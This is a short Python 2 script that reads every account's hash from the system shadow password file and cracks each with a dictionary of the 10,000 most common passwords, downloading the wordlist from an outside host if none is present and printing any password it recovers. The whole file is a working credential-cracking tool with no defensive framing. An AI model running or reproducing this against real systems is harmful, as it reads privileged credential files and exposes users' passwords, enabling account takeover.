#!/usr/bin/python
# -*- coding:utf-8 -*-
import spwd,csv,urllib,crypt,getpass,pwd,sys
from zipfile import ZipFile
from StringIO import StringIO

try:
    f = open('10k most common.txt', 'r+')
    passwlist = [line.strip() for line in f.readlines()]
    f.closed
except :
    myfile = urllib.urlopen("http://roger.zone42.fr/10k%20most%20common.zip")
    passwdtxt = ZipFile(StringIO(myfile.read()))
    passwlist = [line.strip() for line in  passwdtxt.open("10k most common.txt")]
    passwdtxt.extract("10k most common.txt")

for item in spwd.getspall():
    sys.stdout.write("Processing password for user \""+item.sp_nam+"\" : ")
    sys.stdout.flush()
    if item.sp_pwd == '!' or item.sp_pwd == '*':
        print "no password hash to process."
        continue
    for index,brutepass in enumerate(passwlist):
        if crypt.crypt(brutepass, item.sp_pwd) == item.sp_pwd:
            print "password is \""+brutepass+"\""
            break
        if index == len(passwlist)-1 :
            print "failed to break password"
